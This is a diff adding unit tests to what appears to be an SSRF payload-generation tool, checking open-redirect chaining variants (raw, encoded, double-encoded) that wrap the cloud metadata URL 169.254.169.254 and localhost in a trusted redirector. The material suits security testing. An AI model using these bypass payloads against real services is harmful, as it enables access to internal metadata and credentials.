@@ -245,3 +245,150 @@ def test_preserves_port_and_query():
 
 def test_mutate_is_build_variants_alias():
     assert m.mutate is build_variants
+
+
+# --------------------------------------------------------------------------- #
+# Open-redirect chaining variants (v0.8)
+# --------------------------------------------------------------------------- #
+
+_INTERNAL = "http://169.254.169.254/latest/meta-data/"
+_REDIR_TEMPLATE = "https://trusted.example/redir?next=FUZZ"
+
+
+def test_redirect_chain_variants_count():
+    """redirect_chain_variants always returns exactly 3 Variant objects."""
+    variants = m.redirect_chain_variants(_INTERNAL, _REDIR_TEMPLATE)
+    assert len(variants) == 3
+
+
+def test_redirect_chain_variants_families():
+    """All 3 variants are in the 'redirect-chain' family."""
+    variants = m.redirect_chain_variants(_INTERNAL, _REDIR_TEMPLATE)
+    assert all(v.family == "redirect-chain" for v in variants)
+
+
+def test_redirect_chain_raw_exact_bytes():
+    """Raw variant embeds the internal URL verbatim."""
+    variants = m.redirect_chain_variants(_INTERNAL, _REDIR_TEMPLATE)
+    raw = next(v for v in variants if v.name == "redirect-chain-raw")
+    assert raw.value == "https://trusted.example/redir?next=http://169.254.169.254/latest/meta-data/"
+
+
+def test_redirect_chain_encoded_exact_bytes():
+    """Encoded variant percent-encodes the internal URL once (safe='')."""
+    from urllib.parse import quote
+
+    variants = m.redirect_chain_variants(_INTERNAL, _REDIR_TEMPLATE)
+    enc = next(v for v in variants if v.name == "redirect-chain-enc")
+    expected_dest = quote(_INTERNAL, safe="")
+    assert enc.value == f"https://trusted.example/redir?next={expected_dest}"
+    # The embedded destination must not contain unencoded '://' (safety check).
+    embedded = enc.value.split("next=", 1)[1]
+    assert "://" not in embedded
+
+
+def test_redirect_chain_double_encoded_exact_bytes():
+    """Double-encoded variant applies quote() twice."""
+    from urllib.parse import quote
+
+    variants = m.redirect_chain_variants(_INTERNAL, _REDIR_TEMPLATE)
+    dbl = next(v for v in variants if v.name == "redirect-chain-double-enc")
+    expected_dest = quote(quote(_INTERNAL, safe=""), safe="")
+    assert dbl.value == f"https://trusted.example/redir?next={expected_dest}"
+    # The %25 sequences confirm the second encoding pass.
+    embedded = dbl.value.split("next=", 1)[1]
+    assert "%25" in embedded
+
+
+def test_redirect_chain_custom_marker():
+    """A non-FUZZ marker token is replaced correctly."""
+    variants = m.redirect_chain_variants(
+        "http://127.0.0.1/",
+        "https://trusted.example/oauth?redirect_uri={DEST}",
+        marker="{DEST}",
+    )
+    raw = next(v for v in variants if v.name == "redirect-chain-raw")
+    assert raw.value == "https://trusted.example/oauth?redirect_uri=http://127.0.0.1/"
+
+
+def test_redirect_chain_all_names_present():
+    """All three sub-variant names are in the returned list."""
+    names = {v.name for v in m.redirect_chain_variants(_INTERNAL, _REDIR_TEMPLATE)}
+    assert names == {"redirect-chain-raw", "redirect-chain-enc", "redirect-chain-double-enc"}
+
+
+# --------------------------------------------------------------------------- #
+# build_variants: redirect_url integration
+# --------------------------------------------------------------------------- #
+
+def test_build_variants_no_redirect_chain_by_default():
+    """redirect-chain variants are absent when redirect_url is not given."""
+    names = {v.name for v in build_variants(_SEED, decoy=_DECOY)}
+    assert "redirect-chain-raw" not in names
+    assert "redirect-chain-enc" not in names
+    assert "redirect-chain-double-enc" not in names
+
+
+def test_build_variants_emits_redirect_chain_when_redirect_url_set():
+    """When redirect_url is provided, all 3 redirect-chain variants appear."""
+    variants = build_variants(
+        _SEED,
+        decoy=_DECOY,
+        redirect_url=_REDIR_TEMPLATE,
+    )
+    rchain = [v for v in variants if v.family == "redirect-chain"]
+    assert len(rchain) == 3
+    assert {v.name for v in rchain} == {
+        "redirect-chain-raw", "redirect-chain-enc", "redirect-chain-double-enc"
+    }
+
+
+def test_build_variants_redirect_chain_comes_first():
+    """Redirect-chain family is the first family in the ordered catalog."""
+    variants = build_variants(_SEED, decoy=_DECOY, redirect_url=_REDIR_TEMPLATE)
+    assert variants[0].family == "redirect-chain"
+
+
+def test_build_variants_ordering_with_redirect_chain():
+    """Full ordering with redirect_url: redirect-chain -> userinfo -> dns-rebind -> parser-differential -> encoding -> scheme."""
+    variants = build_variants(_SEED, decoy=_DECOY, redirect_url=_REDIR_TEMPLATE)
+    families = [v.family for v in variants]
+    first_idx: dict[str, int] = {}
+    for i, fam in enumerate(families):
+        first_idx.setdefault(fam, i)
+    order = [
+        "redirect-chain", "userinfo", "dns-rebind",
+        "parser-differential", "encoding", "scheme",
+    ]
+    seen = [first_idx[f] for f in order if f in first_idx]
+    assert seen == sorted(seen), f"family ordering violated: {families}"
+
+
+def test_build_variants_redirect_chain_uses_custom_redirect_marker():
+    """redirect_marker is forwarded to redirect_chain_variants correctly."""
+    variants = build_variants(
+        "http://127.0.0.1/",
+        decoy=_DECOY,
+        redirect_url="https://trusted.example/?url={X}",
+        redirect_marker="{X}",
+    )
+    raw = next(v for v in variants if v.name == "redirect-chain-raw")
+    assert raw.value == "https://trusted.example/?url=http://127.0.0.1/"
+
+
+def test_build_variants_redirect_chain_raw_contains_internal_url():
+    """The raw redirect-chain variant embeds the exact internal SSRF URL."""
+    variants = build_variants(_SEED, decoy=_DECOY, redirect_url=_REDIR_TEMPLATE)
+    raw = next(v for v in variants if v.name == "redirect-chain-raw")
+    assert _SEED in raw.value
+    assert raw.value.startswith("https://trusted.example/redir?next=")
+
+
+def test_build_variants_existing_catalog_unchanged_with_redirect_url():
+    """All existing (non-redirect-chain) variants still appear when redirect_url is set."""
+    with_redir = build_variants(_SEED, decoy=_DECOY, redirect_url=_REDIR_TEMPLATE)
+    without_redir = build_variants(_SEED, decoy=_DECOY)
+    names_with = {v.name for v in with_redir}
+    names_without = {v.name for v in without_redir}
+    # Every variant present without redirect_url must also be present with it.
+    assert names_without <= names_with
